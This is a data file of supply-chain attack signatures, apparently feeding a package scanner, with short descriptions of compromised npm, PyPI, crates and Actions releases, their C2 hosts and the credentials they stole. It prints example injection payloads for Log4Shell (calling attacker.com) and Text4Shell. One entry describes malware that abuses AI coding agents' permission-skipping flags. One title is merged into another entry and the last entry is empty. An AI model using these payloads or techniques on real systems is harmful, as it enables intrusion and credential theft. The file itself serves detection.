signatures.title: Codecov bash uploader — CI secret exfiltration via modified script
signatures.description:
In January-April 2021, the Codecov bash uploader script was compromised after
attackers exploited a vulnerability in Codecov's Docker image creation process
to extract credentials and modify the bash uploader script hosted at
codecov.io/bash. The modified script exfiltrated environment variables, source
code, and CI/CD secrets (including tokens and keys) from any CI pipeline that
used it. The compromise persisted undetected for over two months and affected
thousands of repositories including those of Twitch, HashiCorp, and other major
companies. This was also used via the codecov/codecov-action GitHub Action.

signatures.title: codfish/semantic-release-action compromised with Miasma stealer
signatures.description:
codfish/semantic-release-action was compromised on June 24, 2026 via force-pushed commits
repointing tags v2 through v5. The payload installs Bun runtime and executes obfuscated
index.js using the Miasma credential stealing framework, targeting GITHUB_TOKEN, NPM_TOKEN,
and CI/CD environment secrets. Uses dead-drop via GitHub commit search for C2 commands.

signatures.title: reviewdog/action-setup — GitHub Actions supply chain compromise
signatures.description:
In March 2025, the reviewdog/action-setup GitHub Action was compromised as part
of the same attack wave that hit tj-actions/changed-files. The attacker gained
access to the reviewdog organization and modified the action to inject malicious
code that exfiltrated CI/CD secrets from workflow runs. This compromise served
as the initial vector for the broader attack — a compromised reviewdog PAT was
used in the tj-actions CI workflow, enabling the cascading compromise. The incident
demonstrated how trust chains between GitHub Actions can amplify supply chain attacks.

signatures.title: tj-actions/changed-files — GitHub Actions secret exfiltration
signatures.description:
In March 2025, the popular GitHub Action tj-actions/changed-files was compromised
when an attacker modified the action's code via a forced tag update. The malicious
version injected a step that dumped all CI/CD secrets and environment variables
into the GitHub Actions workflow logs, making them publicly visible in the build
output of any public repository using the action. The action had over 23,000
dependent repositories. The compromise was traced back to a cascading attack
originating from the reviewdog/action-setup action.

signatures.title: Compromised append-only-vec crate with credential stealer
signatures.description:
The append-only-vec crate (4M downloads) was compromised in version 0.1.9 via injected
proc-macro1 typosquat dependency. The build.rs payload downloads platform-specific binaries
(Linux x86_64, macOS aarch64) that steal browser credentials from Chromium-based browsers
and establish persistent C2 communication with 23.254.165.112:443.

signatures.title: Compromised arrayref crate with credential stealer
signatures.description:
The arrayref crate (244M downloads) was compromised in version 0.3.10 with a single injected
manifest line adding proc-macro1 (typosquat of proc-macro2). The malicious build.rs downloads
Rust binaries that steal Chromium saved logins, install macOS LaunchAgent persistence, and
connect to C2 at 23.254.165.112:443 for remote command execution.

signatures.title: Compromised internment crate with credential stealer
signatures.description:
The internment crate (14M downloads) was compromised in version 0.8.7 with injected proc-macro1
typosquat dependency. Part of the same campaign targeting arrayref and append-only-vec. The
build.rs downloads executables that steal Chromium browser credentials and establish persistent
C2 connectivity to 23.254.165.112 with shell command capabilities.

signatures.title: liblzma-rs — Rust crate vendoring CVE-2024-3094 affected liblzma
signatures.description:
The Rust crate liblzma-sys vendors the liblzma C library source code directly.
Versions 0.3.2 and 0.3.3 vendor the compromised XZ Utils 5.6.0/5.6.1 source
containing the CVE-2024-3094 backdoor. The backdoor hooks the RSA_public_decrypt
function in OpenSSH via IFUNC resolver manipulation, enabling pre-authentication
remote code execution by the attacker's hardcoded RSA key. Any Rust binary linking
this crate and running alongside systemd-linked sshd is compromised.

signatures.title: Malicious proc-macro1 typosquat crate
signatures.description:
Typosquat of the legitimate proc-macro2 crate, injected as a dependency into compromised crates
arrayref, append-only-vec, and internment. The build.rs executes at compile time, downloading
platform-specific binaries that steal Chromium browser credentials, establish C2 communication
with 23.254.165.112:443, and install macOS LaunchAgent persistence. No user code changes needed.

signatures.title: rustdecimal typosquat — malware targeting rust_decimal users
signatures.description:
In May 2022, a malicious crate named rustdecimal was discovered on crates.io,
typosquatting the legitimate and popular rust_decimal crate (which uses an
underscore). The malicious crate contained obfuscated code that downloaded and
executed a malware payload. The attack was notable as one of the first confirmed
supply chain attacks on the Rust ecosystem via crates.io. The crate was removed
from the registry after discovery, prompting discussions about namespace
protection policies for crates.io.

signatures.title: boltdb-go/bolt typosquat — cryptominer targeting bbolt users
signatures.description:
In early 2025, a malicious Go module github.com/boltdb-go/bolt was discovered
typosquatting the legitimate and widely-used github.com/etcd-io/bbolt (formerly
boltdb/bolt) embedded key-value database. The malicious package contained a
cryptominer that was downloaded and executed upon import. The attack exploited
Go's module proxy caching, which made it difficult to remove the malicious module
once cached. The legitimate bbolt package is a dependency of Kubernetes etcd and
many other critical Go infrastructure projects.

signatures.title: SUNBURST / SolarWinds Orion — DLL backdoor build injection 2020
signatures.description:
The SolarWinds Orion build system was compromised by Russian state actor COZY BEAR /
APT29. A trojanised DLL (SolarWinds.Orion.Core.BusinessLayer.dll) was injected during
the build process and signed with a legitimate SolarWinds certificate. The SUNBURST
malware dormant period (12–14 days), DGA-based C2, and signed binary delivery made it
undetectable by conventional tools. Any Go SDK or tooling distributed alongside Orion
2020.2.0–2020.2.1 packages should be treated as potentially compromised. This is the
canonical example of a build-system injection attack.

signatures.title: Codecov bash uploader supply chain compromise — CI token harvest
signatures.description:
In April 2021, Codecov's bash uploader script distributed via codecov.io was tampered
with by an attacker who exploited a misconfigured Google Cloud Storage bucket. The
modified script extracted environment variables from CI pipelines — including AWS keys,
GitHub tokens, and other secrets — and exfiltrated them to a remote endpoint. The Maven
plugin for Codecov pulled the affected bash uploader during execution. Any build that
ran the Codecov uploader between January 31 and April 1, 2021 should be treated as
fully compromised; all CI/CD credentials must be rotated.

signatures.title: Text4Shell — RCE in Apache Commons Text string interpolation
signatures.description:
CVE-2022-42889 (Text4Shell), disclosed in October 2022, was a remote code
execution vulnerability in Apache Commons Text. The StringSubstitutor class
performed unsafe interpolation of string lookups, including script, dns, and url
prefixes. Attackers could inject crafted interpolation strings (e.g.,
${script:javascript:java.lang.Runtime.getRuntime().exec('cmd')}) to achieve
arbitrary code execution. While less universally exploitable than Log4Shell
due to requiring specific API usage patterns, it affected applications that
passed untrusted input through Commons Text string interpolation.

signatures.title: Log4Shell — critical RCE in Apache Log4j via JNDI injection
signatures.description:
CVE-2021-44228 (Log4Shell), disclosed in December 2021, is one of the most
severe vulnerabilities in software history. Apache Log4j 2.x contained a JNDI
injection flaw that allowed unauthenticated remote code execution via crafted
log messages containing ${jndi:ldap://attacker.com/a} payloads. The vulnerability
was trivially exploitable and affected virtually every Java application using Log4j
for logging, including enterprise systems, cloud services, and embedded devices.
Mass exploitation began within hours of public disclosure.

signatures.title: scribejava-core OAuth credential stealer typosquat (MAL-2025-2552)
signatures.description:
A malicious Maven artifact published under groupId io.github.leetcrunch typosquatting the
legitimate com.github.scribejava:scribejava-core OAuth library. Version 8.3.5 covertly
harvests and exfiltrates OAuth credentials on a time-based trigger (every 15th of the month),
making detection through casual testing difficult. The periodic exfiltration schedule is
designed to evade CI/CD security scans that typically run during build time. Any version
of this package under the leetcrunch groupId is malicious.

signatures.title: Spring4Shell — RCE in Spring Framework via data binding
signatures.description:
CVE-2022-22965 (Spring4Shell), disclosed in March 2022, was a critical remote
code execution vulnerability in the Spring Framework. The flaw existed in the
data binding mechanism when running on JDK 9+ with Apache Tomcat as the servlet
container. Attackers could exploit ClassLoader manipulation via crafted HTTP
requests to modify Tomcat's logging configuration and write a JSP web shell,
achieving full remote code execution. The vulnerability affected Spring MVC
and Spring WebFlux applications deployed as WAR files on Tomcat.

signatures.title: ansi-styles npm hijack (Sept 2025 crypto theft)
signatures.description:
Part of the September 8, 2025 supply chain attack targeting 29 npm packages
via the compromised ~qix maintainer account. ansi-styles@6.2.2 contained
injected Web3 transaction interception code (marker: _0x112fa8) that
hijacked cryptocurrency transfers when a Web3 wallet was present. Other
packages in this campaign included debug@4.4.2, chalk@5.6.1, color@5.0.1,
color-convert@3.1.1, and supports-color@10.2.1.

signatures.title: AsyncAPI generator npm package backdoored via GitHub Actions
signatures.description:
@asyncapi/generator v3.3.1 was compromised in the same campaign as @asyncapi/specs, exploiting
a pull_request_target workflow to steal npm tokens. The obfuscated payload fetches encrypted
loaders from IPFS, deploys Miasma reverse shell connecting to 85.137.53.71:8080, and installs
systemd persistence at ~/.config/systemd/user/miasma-monitor.service on Linux.

signatures.title: AsyncAPI specs npm package backdoored via GitHub Actions
signatures.description:
@asyncapi/specs v6.11.2 was backdoored after an attacker exploited a pull_request_target
workflow vulnerability to steal npm publish tokens. The compromised package fetches encrypted
loaders from IPFS, writes sync.js payload, and establishes persistent reverse shell to
85.137.53.71:8080 using the Miasma toolkit. Beacons system info every ~30 seconds.

signatures.title: Axios npm RAT compromise (Sapphire Sleet)
signatures.description:
On March 30, 2026, North Korean threat actor Sapphire Sleet (UNC1069)
compromised the lead Axios maintainer's npm account and published two
poisoned versions (1.14.1 and 0.30.4) that injected a phantom dependency
plain-crypto-js@4.2.1. The postinstall hook dropped a cross-platform RAT
capable of arbitrary command execution, credential exfiltration, and
persistence on macOS, Windows, and Linux. Live for ~3 hours before removal.

signatures.title: Bitwarden CLI compromised with self-propagating Shai-Hulud worm
signatures.description:
@bitwarden/cli v2026.4.0 (78K weekly downloads) was compromised with a self-propagating worm
identified as "Shai-Hulud: The Third Coming". The preinstall hook executes bw_setup.js which
downloads Bun and runs a 10MB credential harvester targeting SSH keys, cloud credentials
(AWS/GCP/Azure), npm tokens, Claude auth, MCP configs, and .env files. C2 masquerades as
audit.checkmarx.cx:443/v1/telemetry. Exfiltrates to GitHub repos with Dune-themed names.

signatures.title: cache-manager malicious release (Keyv campaign)
signatures.description:
Part of the August 2026 Keyv/Cacheable ecosystem compromise. cache-manager
version 7.2.10 was published with an identical malicious preinstall hook
executing setup.mjs which fetched a second-stage payload (Math_Symbol.js).
The payload harvested developer credentials including GitHub/npm tokens,
cloud provider keys, private SSH keys, and Kubernetes service tokens.

signatures.title: cacheable npm package compromised by Shai-Hulud worm
signatures.description:
cacheable v2.5.1 (30M monthly downloads) was compromised in the Mini Shai-Hulud campaign
that also hit keyv and flat-cache. The worm propagates via stolen npm publish tokens,
injecting preinstall hooks that download Bun and execute obfuscated credential stealers.
Over 444 community packages were secondarily infected across 1,381 versions.

signatures.title: SAP CAP.js postgres package compromised by Shai-Hulud
signatures.description:
@cap-js/postgres v2.2.2 was compromised alongside @cap-js/sqlite and @cap-js/db-service in
the Mini Shai-Hulud campaign. The preinstall hook bootstraps Bun runtime and executes an 11.7MB
obfuscated credential harvester and propagation framework. Uses GitHub commit markers containing
"OhNoWhatsGoingOnWithGitHub" and commits authored as claude@users.noreply.github.com.

signatures.title: SAP CAP.js sqlite package compromised by Shai-Hulud
signatures.description:
@cap-js/sqlite v2.2.2 was compromised in the Mini Shai-Hulud campaign targeting SAP packages.
A preinstall hook runs setup.mjs which downloads Bun 1.3.13, then executes an 11.7MB credential
stealer (execution.js) using ctf-scramble-v2 obfuscation. Targets GitHub/npm/AWS/Azure/GCP/K8s
credentials. Exfiltrates AES-256-GCM encrypted data to randomized GitHub repositories.

signatures.title: chalk npm hijack (Sept 2025 crypto theft)
signatures.description:
Part of the September 8, 2025 supply chain attack on 29 npm packages via
compromised maintainer ~qix. chalk@5.6.1 was published with injected code
that intercepted Web3 cryptocurrency transactions when run in a browser
context. The malware activated when a Web3 wallet was present, redirecting
ETH transactions and tampering with swap/transfer operations. Other packages
in the same campaign include debug@4.4.2, ansi-styles@6.2.2, color@5.0.1,
and strip-ansi@7.1.1.

signatures.title: coa hijacked — malware injection via compromised maintainer account
signatures.description:
In November 2021, the npm package coa (Command-Option-Argument) was hijacked
through a compromised maintainer account. Malicious versions 2.0.3 and 2.0.4
were published containing obfuscated code that downloaded and executed a trojan
targeting Windows systems. The package had approximately 9 million weekly
downloads and was a dependency of react-scripts, causing widespread CI/CD
build failures that initially alerted the community to the compromise.

signatures.title: codexui-android package steals OpenAI/Codex tokens
signatures.description:
codexui-android masquerades as a legitimate Codex remote UI but steals access_token,
refresh_token, id_token, and auth.json from ~/.codex/. Credentials are XOR-encrypted
with key "anyclaw2026", base64-encoded, and exfiltrated via HTTPS POST to
sentry.anyclaw.store/startlog. Malicious code exists only in npm builds, not the GitHub repo.

signatures.title: colors protestware — infinite loop denial of service
signatures.description:
In January 2022, the maintainer of the popular colors npm package (Marak Squires)
deliberately sabotaged version 1.4.1 by introducing an infinite loop that printed
gibberish LIBERTY text to the console, effectively breaking any application that
depended on it. This was a protest against large corporations using open-source
software without compensation. The package had over 20 million weekly downloads
and the sabotage affected thousands of projects including AWS CDK.

signatures.title: debug npm package hijack (Sept 2025 crypto theft)
signatures.description:
On September 8, 2025, the prolific open-source maintainer ~qix was
phished via an email impersonating npm support (from npmjs.help domain).
The compromised account was used to publish malicious versions of 29 packages
including debug@4.4.2, chalk@5.6.1, ansi-styles@6.2.2, color@5.0.1,
strip-ansi@7.1.1, and others. The injected code (identifier: _0x112fa8)
intercepted Web3 wallet transactions to redirect cryptocurrency to
attacker-controlled addresses. Collectively these packages had 2.6 billion
weekly downloads.

signatures.title: DuckDB npm packages hijacked (Sept 2025 crypto theft)
signatures.description:
Part of the September 8, 2025 supply chain attack on 29 npm packages
via the compromised ~qix maintainer account. duckdb@1.3.3 along with
@duckdb/node-api@1.3.3, @duckdb/node-bindings@1.3.3, and
@duckdb/duckdb-wasm@1.29.2 were published with injected Web3 wallet
transaction interception code. The malware activated when a Web3 wallet
was present and redirected cryptocurrency transactions to attacker
addresses.

signatures.title: dYdX protocol npm wallet stealer
signatures.description:
Discovered January 27, 2026, four malicious versions of @dydxprotocol/v4-client-js
were published to npm via compromised maintainer account. The injected code
in registry.ts/registry.js exfiltrated cryptocurrency seed phrases and
device fingerprints to the attacker C2 domain dydx.priceoracle.site. The
domain was registered January 9, 2026 specifically for this campaign.

signatures.title: Malicious easy-day-js package targeting Mastra ecosystem
signatures.description:
easy-day-js v1.11.22 was published as a malicious version of a previously clean package,
used as a dependency by 141 Mastra AI framework packages including @mastra/core. The
postinstall hook fetches second-stage RAT from 23.254.164.92:8000, targeting 160+ browser
crypto wallet extensions including MetaMask and Coinbase. Self-deletes to evade forensics.

signatures.title: eslint-scope hijacked — npm token theft via compromised maintainer
signatures.description:
In July 2018, eslint-scope@3.7.2 was published using a compromised maintainer's
npm credentials. The malicious version contained a postinstall script that
attempted to steal npm tokens from the victim's .npmrc file and exfiltrate them
to a remote server. This was one of the first widely publicized npm supply chain
attacks and directly led to npm implementing two-factor authentication requirements
for popular packages. The package was a dependency of the widely-used eslint tool.

signatures.title: Backdoor in event-stream@3.3.6 — bitcoin wallet theft
signatures.description:
event-stream@3.3.6 was poisoned by a malicious maintainer who gained commit access by
offering to help maintain the abandoned package. The attacker injected the flatmap-stream
dependency which contained an AES-256-CBC encrypted payload that targeted the Copay bitcoin
wallet application. When the decrypted payload ran inside Copay, it harvested private keys
from wallets holding more than 100 BTC and exfiltrated them to a remote server.
The encrypted payload evaded static analysis for weeks.

signatures.title: faker protestware — infinite loop denial of service
signatures.description:
In January 2022, the maintainer of the faker npm package (Marak Squires)
deliberately sabotaged version 6.6.6 by introducing an infinite loop that
printed gibberish text to the console, mirroring the simultaneous sabotage
of the colors package. The faker package was widely used for generating
realistic fake data in testing and development. The version number 6.6.6
was chosen deliberately. The community later forked the project as @faker-js/faker.

signatures.title: flat-cache npm package compromised by Shai-Hulud worm
signatures.description:
flat-cache v6.1.24 (580M monthly downloads) was compromised as part of the Mini Shai-Hulud
npm worm campaign alongside keyv. The preinstall hook downloads Bun runtime and executes an
obfuscated credential stealer targeting npm tokens, GitHub tokens, AWS credentials, Vault
tokens, Stripe/Slack API keys, and SSH private keys. Exfiltration via npm-cache.com:443.

signatures.title: flatmap-stream — encrypted backdoor targeting Copay wallet
signatures.description:
flatmap-stream@0.1.1, published in September 2018, was the malicious dependency
injected into event-stream@3.3.6. It contained an AES-256-CBC encrypted payload
that specifically targeted the Copay bitcoin wallet application. The encrypted
code was hidden in the minified bundle and would only decrypt and execute when
the Copay wallet's package description matched a known hash, allowing it to
steal private keys from wallets with balances over 100 BTC. The attack remained
undetected for approximately two months.

signatures.title: getcookies — hidden backdoor with remote command execution
signatures.description:
In May 2018, the getcookies npm package was discovered to contain a sophisticated
backdoor that allowed remote code execution. The malicious code was hidden within
an Express.js middleware function and activated via specially crafted HTTP request
headers containing encoded commands. The backdoor was injected through the
dependency chain via the mailparser package. This was one of the early examples
of a deeply hidden backdoor in the npm ecosystem.

signatures.title: Injective Labs SDK compromised with wallet key stealer
signatures.description:
@injectivelabs/sdk-ts v1.20.21 was compromised to intercept wallet mnemonic and private key
derivation via PrivateKey.fromMnemonic() and PrivateKey.fromHex(). Stolen keys are exfiltrated
via POST to testnet.archival.chain.grpc-web.injective.network, encoded in X-Request-Id headers
to disguise as gRPC-web traffic. 17 additional @injectivelabs packages pulled the poisoned SDK.

signatures.title: Keyv npm package compromised by Shai-Hulud worm
signatures.description:
Keyv v6.0.0 (604M monthly downloads) was compromised in the Mini Shai-Hulud supply chain
campaign. A preinstall hook executes setup.mjs dropper that downloads Bun runtime and runs
a 728KB obfuscated credential stealer (Math_Symbol.js) harvesting npm tokens, GitHub PATs,
AWS credentials, Kubernetes tokens, SSH keys, and more. Data exfiltrated to npm-cache.com:443.

signatures.title: @ledgerhq/connect-kit hijacked — crypto wallet drainer
signatures.description:
In December 2023, a former Ledger employee's npm account was compromised via a
phishing attack, allowing the attacker to publish malicious versions 1.1.5, 1.1.6,
and 1.1.7 of @ledgerhq/connect-kit. The compromised versions contained a crypto
wallet drainer that injected rogue JavaScript via a malicious WalletConnect clone,
prompting users to approve fraudulent transactions that drained their crypto assets.
The malicious code was live for approximately 5 hours and resulted in at least
$600,000 in stolen cryptocurrency. Ledger replaced the package within hours.

signatures.title: lottie-player hijacked — crypto wallet drainer injection
signatures.description:
In October 2024, the LottieFiles lottie-player npm package was compromised when
a maintainer's npm access token was stolen. Malicious versions 2.0.4 through 2.0.8
were published containing injected code that displayed a fake Web3 wallet connection
popup. When users connected their wallets, the code drained their cryptocurrency
assets. The package was widely used for rendering Lottie animations on websites.
LottieFiles quickly published a clean version 2.0.9 and revoked compromised tokens.

signatures.title: ngx-bootstrap Shai-Hulud worm compromise
signatures.description:
Beginning September 15, 2025, the Shai-Hulud worm-like malware campaign
compromised ngx-bootstrap across multiple versions (20.0.3-20.0.6, 19.0.3,
18.1.4). The postinstall script (bundle.js) harvested developer tokens
including npm, GitHub, and cloud credentials, then exfiltrated secrets
via webhooks and attacker-controlled GitHub repositories. The campaign
also targeted CI/CD environments through GitHub Actions exfiltration.

signatures.title: node-ipc protestware — wiperware targeting Russian/Belarusian IPs
signatures.description:
node-ipc versions 10.1.1 and 10.1.2 contain intentional destructive code added by the
maintainer in protest of Russia's invasion of Ukraine. Depending on the caller's geolocation
(resolved via ipinfo.io), the package overwrites all accessible files on disk with a heart
emoji, effectively acting as a wiper. This is a confirmed supply chain attack affecting
vue-cli and over 30 million downstream installations. The attack demonstrates the
"protestware" or "sabotware" threat model: maintainer with legitimate access deliberately
weaponising their own package.

signatures.title: Nx AI-weaponized credential theft
signatures.description:
On August 26-27, 2025, eight malicious Nx releases were published via a
compromised npm token stolen through a flawed GitHub Actions workflow. The
postinstall script (telemetry.js) weaponized local AI coding agents (Claude
Code with --dangerously-skip-permissions, Gemini CLI with --yolo) to
inventory sensitive files. The payload harvested GitHub tokens, npm tokens,
SSH keys, .env files, and crypto wallet artifacts, then exfiltrated data
via attacker-created GitHub repositories. Also appended shutdown commands
to shell configs. Live for ~5 hours before removal.

signatures.title: @nx/key malicious package (Nx campaign)
peacenotwar — file-wiping protestware targeting Russia/Belarus
signatures.description:
In March 2022, the maintainer of the node-ipc npm package added peacenotwar
as a dependency. The peacenotwar module contained code that, when executed on
machines with IP addresses geolocated to Russia or Belarus, would overwrite
files on the filesystem with heart emojis, causing destructive data loss.
This was framed as an anti-war protest following Russia's invasion of Ukraine.
The node-ipc package had over 1 million weekly downloads and was a dependency
of Vue.js CLI tooling.

signatures.title: plain-crypto-js RAT dropper (Axios attack)
signatures.description:
Malicious npm package published on March 30, 2026 as part of the Axios
supply chain compromise attributed to North Korean actor Sapphire Sleet.
The package was injected as a phantom dependency into axios@1.14.1 and
axios@0.30.4. Its postinstall script (setup.js) downloaded platform-specific
second-stage payloads from sfrclak.com:8000, then self-cleaned by deleting
itself and restoring a benign package.json. A clean decoy version 4.2.0
had been pre-staged 18 hours prior.

signatures.title: polyfill.io CDN domain hijack — JS supply chain injection 2024
signatures.description:
In June 2024, the polyfill.io domain and CDN infrastructure was acquired by a Chinese
company (Funnull). The new operator modified the JavaScript served from cdn.polyfill.io
to inject malicious code into visitor browsers, including mobile redirect malware, fake
Google Analytics scripts, and ad fraud payloads. Over 100,000 websites were affected.
Any package that depends on or references the cdn.polyfill.io CDN endpoint should be
flagged and replaced with a self-hosted alternative such as Cloudflare's polyfill mirror.

signatures.title: rc hijacked — same attack wave as coa compromise
signatures.description:
In November 2021, the npm package rc was hijacked in the same attack wave that
compromised the coa package. Malicious versions 1.2.9, 1.3.9, and 2.3.9 were
published containing obfuscated malware that downloaded and executed a trojan
on Windows systems. The rc package had approximately 14 million weekly downloads,
making this one of the highest-impact npm supply chain attacks of 2021.

signatures.title: Fake unscoped tanstack package steals .env files
signatures.description:
Four versions of a fake unscoped "tanstack" package (typosquatting @tanstack/*) were published
in 27 minutes on April 29, 2026. The postinstall.cjs reads .env, .env.local, .env.production,
.env.staging, and .env.development files from the developer's working directory and POSTs them
as JSON to a Svix webhook endpoint (api.svix.com). Version 2.0.5 also targeted AGENTS.md files.

signatures.title: ua-parser-js hijacked — cryptominer and password stealer
signatures.description:
In October 2021, the npm account of the ua-parser-js maintainer was compromised
and versions 0.7.29, 0.8.0, and 1.0.0 were published containing malware. The
malicious code installed a cryptominer (jsextension/jsextension.exe) and a
credential-stealing trojan on Linux and Windows systems. With over 7 million
weekly downloads, the package was used by major companies and frameworks including
Facebook. The compromised versions were available for approximately 4 hours.

signatures.title: XZ Utils / liblzma backdoor — CVE-2024-3094
signatures.description:
npm wrappers for the liblzma/xz-utils C library that pin affected versions containing
the CVE-2024-3094 backdoor. The malicious code was injected into the upstream XZ Utils
build system by a long-term social engineering actor ("Jia Tan"). The backdoor hooks
OpenSSH authentication, allowing remote code execution by the attacker's RSA key on
systemd-linked sshd. Any npm package that vendors or links the affected liblzma
5.6.0–5.6.1 release artifacts is compromised.

signatures.title: Microsoft.UI.Xaml.Markup typosquat — .NET supply chain attack
signatures.description:
Malicious packages on NuGet.org were discovered typosquatting legitimate Microsoft
namespace packages, including variations of Microsoft.UI.Xaml.Markup. The attack
exploited NuGet's lack of namespace reservation enforcement to publish packages
with names resembling official Microsoft packages. These typosquats contained
obfuscated code that could download and execute additional payloads. The campaign
highlighted the risk of namespace confusion attacks in the .NET ecosystem, where
the Microsoft.* prefix creates a false sense of trust.

signatures.title: Malicious anthropickit package exfiltrates SSH keys and secrets
signatures.description:
anthropickit v999.9.9 was published to PyPI on June 14, 2026, using an inflated version
number to override legitimate packages via dependency confusion. The setup.py executes during
installation, collecting SSH private keys from ~/.ssh, SSH configs, and environment variables
matching KEY/SECRET/TOKEN/PASS/AUTH/API patterns. Data exfiltrated via POST to
enqqnvvtgrnyl.x.pipedream.net and staged locally at /tmp/runner_exfil.json.

signatures.title: colourama typosquat — credential stealer mimicking colorama
signatures.description:
The colourama package on PyPI was a typosquat of the popular colorama library
(which has over 150 million monthly downloads). The malicious package mimicked
colorama's functionality while also containing code that harvested credentials
and environment variables from infected systems. It exploited the common British
English spelling of "colour" to trick developers into installing the wrong package.
The package was eventually removed from PyPI after being reported.

signatures.title: ctx PyPI package hijack — cryptominer via expired domain takeover
signatures.description:
The legitimate ctx package (version 0.1.2, 22k monthly downloads) was abandoned and its
maintainer's email domain expired. An attacker registered the expired domain, reset the
PyPI account password, and uploaded ctx 0.2.0 containing code that reads all environment
variables (including cloud credentials, API keys, and secrets) and exfiltrates them via
HTTP POST to a Heroku endpoint. The attack exploited PyPI's trust in email-based account
recovery. Affected installations should rotate all secrets immediately.

signatures.title: Docling unsafe PyYAML deserialization RCE (CVE-2026-24009)
signatures.description:
CVE-2026-24009 is a remote code execution vulnerability in Docling, a document parsing
framework for converting documents into AI-ready data. The vulnerability arises from unsafe
PyYAML deserialization using an unsafe loader that can construct arbitrary Python objects
during parsing. An attacker can supply a malicious document containing crafted YAML content
that executes arbitrary code silently during normal parsing operations without crashing the
application or triggering obvious errors. Fixed in docling-core v2.48.4 by switching to
safe YAML loaders.

signatures.title: durabletask PyPI credential stealer (TeamPCP/AntV)
signatures.description:
On May 20, 2026, as part of the AntV Mini Shai-Hulud campaign expansion,
three malicious versions of Microsoft's durabletask PyPI package were
published by TeamPCP. The dropper payload had three functions: credential
harvesting from cloud providers, password managers, and developer tooling;
worm propagation to additional packages; and irreversible disk wiping.
The infostealer executed only on Linux. Second-stage payload (rope.pyz)
fetched from check.git-service.com. Package had ~103K weekly downloads.

signatures.title: dYdX PyPI wallet stealer and RAT
signatures.description:
Discovered January 27, 2026, a malicious version of the dydx-v4-client
PyPI package was published with both a cryptocurrency wallet stealer and
a Remote Access Trojan. The RAT was hidden in account.py using 100
iterations of obfuscation (reverse, base64, zlib). Capabilities included
stealing SSH keys, API credentials, source code, installing persistent
backdoors, and pivoting to other systems. C2 at dydx.priceoracle.site/py.

signatures.title: jeIlyfish typosquat — credential stealer using homoglyph attack
signatures.description:
In 2019, a malicious package named "jeIlyfish" (with a capital I instead of
lowercase L) was found on PyPI, typosquatting the legitimate jellyfish library
used for approximate and phonetic string matching. The homoglyph substitution
made the package name visually indistinguishable from the real one. The malicious
package contained the full legitimate code but also included obfuscated code that
exfiltrated SSH keys, GPG keys, and other credentials to a remote server. It was
available on PyPI for over a year before discovery.

signatures.title: PyTorch Lightning package compromised by Shai-Hulud
signatures.description:
PyTorch Lightning (lightning) versions 2.6.2-2.6.3 were compromised by the Mini Shai-Hulud
campaign. Malicious code in __init__.py spawns a daemon thread executing start.py, which
downloads Bun 1.3.13 and runs router_runtime.js (11MB payload). Steals SSH keys, crypto
wallets (Bitcoin, Monero, Exodus, Ledger), VPN credentials, Discord/Slack sessions, and
cloud configs. Exfiltrates RSA-2048 encrypted data to public GitHub repositories.

signatures.title: LiteLLM MCP endpoint unauthenticated RCE (CVE-2026-42271)
signatures.description:
CVE-2026-42271 is a critical command injection vulnerability in LiteLLM's MCP server test
endpoints (/mcp-rest/test/connection and /mcp-rest/test/tools/list). These endpoints accept
a full server configuration including command, arguments, and environment variables, which
LiteLLM spawns as an unsandboxed subprocess. When chained with CVE-2026-48710 (Starlette
Host header validation bypass), an unauthenticated attacker can achieve arbitrary command
execution on the proxy host, steal model provider API keys (OpenAI, Anthropic, Azure),
and move laterally into connected AI infrastructure. Affects versions 1.74.2 through 1.83.6.

signatures.title: LiteLLM PyPI credential stealer and wiper
signatures.description:
On March 24, 2026, TeamPCP published two malicious versions of litellm
(1.82.7 and 1.82.8) to PyPI using credentials stolen from the prior Trivy
compromise. The payload used a .pth file that auto-executes with any Python
interpreter startup. The three-stage attack harvested credentials, attempted
lateral movement across Kubernetes clusters, and installed a persistent
systemd backdoor polling for additional payloads from check.git-service.com
via rope.pyz second-stage. Live for ~40 minutes. LiteLLM has 95M+ monthly
downloads and is widely used in AI agent frameworks.

signatures.title: Lore-ml/ai-exploits — HuggingFace pickle deserialization attack
signatures.description:
Researchers discovered malicious machine learning models on HuggingFace Hub that
exploited Python's pickle deserialization to achieve remote code execution. The
technique abuses the fact that ML model files (PyTorch .pt, .pkl, and safetensors
formats) can embed arbitrary Python code via pickle's __reduce__ method. When users
loaded these models using standard ML libraries, the embedded code executed
automatically. This highlighted systemic risks in the ML supply chain where model
files are treated as data but can contain executable payloads.

signatures.title: python3-dateutil typosquat — credential stealer
signatures.description:
In 2019, the python3-dateutil package was discovered on PyPI as a typosquat of
the legitimate python-dateutil library. The malicious package contained the full
legitimate dateutil code to maintain functionality, but also included obfuscated
code that stole credentials and environment variables from the infected system,
exfiltrating data to a remote server. The legitimate package (python-dateutil) has
over 100 million monthly downloads, making the typosquat highly effective.

signatures.title: pytorch-nightly dependency confusion — torchtriton hijack
signatures.description:
In December 2022, a dependency confusion attack targeted PyTorch's nightly build
process. The attacker registered a malicious package called torchtriton on public
PyPI, which shadowed PyTorch's legitimate internal torchtriton dependency hosted
on their private index. When users installed pytorch-nightly, pip resolved the
dependency from public PyPI instead of the private index, installing the malicious
version. The compromised package exfiltrated system information, environment
variables, SSH keys, and the first 1000 files in the home directory.

signatures.title: requests-dmarc — typosquat of requests targeting security tooling
signatures.description:
requests-dmarc is a package published on PyPI with no legitimate purpose — its name
implies it is an extension of the widely-used `requests` HTTP library but it contains
malicious setup.py code that harvests environment variables, SSH keys from ~/.ssh/,
AWS credentials from ~/.aws/credentials, and exfiltrates the data to an attacker-controlled
endpoint on install. The package impersonates security-adjacent tooling to target
developers working on email security infrastructure who may be less suspicious.

signatures.title: Telnyx PyPI credential stealer (TeamPCP)
signatures.description:
On March 27, 2026, TeamPCP published two backdoored versions of the Telnyx
SDK (4.87.1, 4.87.2) to PyPI as part of their credential-chaining campaign.
Malicious code injected into telnyx/_client.py executed at import time. The
loader downloaded second-stage payloads disguised as WAV files (hangup.wav
for Windows, ringtone.wav for Linux) from C2 infrastructure, decoded them
via XOR using the first 8 bytes as key, and executed the payload. Part of
the Trivy -> KICS -> LiteLLM -> Telnyx attack chain. Over 1M monthly
downloads affected.

signatures.title: ultralytics compromised — cryptominer via GitHub Actions injection
signatures.description:
In December 2024, the popular ultralytics YOLO computer vision library was
compromised through a sophisticated attack on its GitHub Actions CI/CD pipeline.
Attackers exploited a known vulnerability in the build process to inject malicious
code into PyPI releases 8.3.41 and 8.3.42. The compromised versions contained
a cryptominer (XMRig) that was downloaded and executed on installation. The package
has over 50 million total downloads. Clean version 8.3.43 was released promptly.

signatures.title: bootstrap-sass gem hijacked — backdoor via malicious version
signatures.description:
